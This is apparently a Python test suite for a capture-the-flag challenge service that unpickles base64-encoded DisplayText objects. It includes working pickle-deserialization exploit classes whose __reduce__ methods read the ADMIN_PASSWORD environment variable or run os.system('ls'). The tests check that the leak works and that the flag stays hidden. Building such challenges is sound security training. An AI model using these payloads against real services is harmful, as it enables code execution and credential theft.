#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2016, Bright Pixel
#
# For these tests to work, remember to start the service
# from a clean slate. Otherwise, if a test fails, it may
# leave stuff around and mess up the next testing round.
#


from __future__ import print_function
from __future__ import division
from __future__ import unicode_literals
from __future__ import absolute_import


import unittest
import requests
import os
import sys
import cPickle as pickle

from base64 import b64encode, b64decode

# Ensure the application source is reachable...
sys.path.insert(0, os.path.join(os.path.split(__file__)[0], '../src'))

from protocol import DisplayText
from app import ADMIN_PASSWORD, DISPLAY_LENGTH


# Enforced invariant for testing...
DEFAULT_TEXT = "Default Text"


class ExploitDisplayText(DisplayText):
    def __reduce__(self):
        return (os.getenv, ("ADMIN_PASSWORD",))


class InvalidDisplayText(DisplayText):
    def __reduce__(self):
        return (os.system, ("ls",))


class TestApp(unittest.TestCase):
    def setUp(cls):
        text = DisplayText(DEFAULT_TEXT)

        payload = b64encode(pickle.dumps(text))
        requests.post("http://127.0.0.1:30877/text", data=payload)


    def test_get_text(self):
        r = requests.get("http://127.0.0.1:30877/text")
        self.assertEqual(r.status_code, 200)

        payload = b64decode(r.content)
        self.assertRegexpMatches(payload, r"[\n]DisplayText[\n]")

        text = pickle.loads(payload)

        self.assertTrue(isinstance(text, DisplayText))
        self.assertEqual(str(text), DEFAULT_TEXT)


    def test_set_text(self):
        random_text = os.urandom(40).encode("hex")

        text = DisplayText(random_text)

        payload = pickle.dumps(text)
        self.assertRegexpMatches(payload, r"[\n]DisplayText[\n]")

        payload = b64encode(payload)

        r = requests.post("http://127.0.0.1:30877/text", data=payload)
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.text, random_text[:DISPLAY_LENGTH])


    def test_empty_payload(self):
        r = requests.post("http://127.0.0.1:30877/text")
        self.assertEquals(r.status_code, 400)
        self.assertTrue("hint: " in r.text.lower())


    def test_bad_payload(self):
        r = requests.post("http://127.0.0.1:30877/text", data="--bad-payload--")
        self.assertEquals(r.status_code, 400)

        # Didn't even pass beyond Base64 decoding...
        self.assertTrue("hint: " not in r.text.lower())


    def test_bad_pickle(self):
        r = requests.post("http://127.0.0.1:30877/text", data=b64encode("--bad-pickle--"))
        self.assertEqual(r.status_code, 400)

        # Passed Base64 decoding, but didn't reach unpickling...
        self.assertTrue("hint: " in r.text.lower())


    def test_exploit(self):
        text = ExploitDisplayText("--does-not-matter--")
        payload = b64encode(pickle.dumps(text))

        r = requests.post("http://127.0.0.1:30877/text", data=payload)
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.text, ADMIN_PASSWORD)


    def test_invalid_exploit(self):
        text = InvalidDisplayText("--does-not-matter--")
        payload = b64encode(pickle.dumps(text))

        r = requests.post("http://127.0.0.1:30877/text", data=payload)
        self.assertEqual(r.status_code, 400)

        # Filtered out because the InvalidDisplayText class tries to use "os.system"...
        self.assertTrue("hint: " in r.text.lower())


    def test_text_invariant(self):
        """Test that the flag isn't exposed when a team solves the challenge."""

        text = ExploitDisplayText("--does-not-matter--")
        payload = b64encode(pickle.dumps(text))

        r = requests.post("http://127.0.0.1:30877/text", data=payload)
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.text, ADMIN_PASSWORD)  # ...supposedly the text was set.

        r = requests.get("http://127.0.0.1:30877/text")
        self.assertEqual(r.status_code, 200)

        text = pickle.loads(b64decode(r.content))
        self.assertNotEqual(str(text), ADMIN_PASSWORD)  # ...but it actually wasn't.




if __name__ == "__main__":
    unittest.main()


# vim: set expandtab ts=4 sw=4:
